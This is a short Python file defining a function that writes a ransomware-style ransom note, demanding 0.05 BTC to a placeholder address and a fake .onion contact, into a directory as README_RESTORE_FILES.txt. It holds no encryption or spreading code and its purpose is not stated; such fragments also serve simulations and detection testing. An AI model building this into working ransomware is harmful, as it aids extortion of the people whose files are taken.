import os


def drop_ransom_note(directory, btc_address="1FakeBTCAddr123"):
    note = f"""
    YOUR FILES HAVE BEEN ENCRYPTED.

    Send 0.05 BTC to: {btc_address}
    Then contact: recover@fakeemail.onion

    Failure to do so will result in permanent loss of your data.
    """
    note_path = os.path.join(directory, "README_RESTORE_FILES.txt")
    with open(note_path, "w") as f:
        f.write(note)
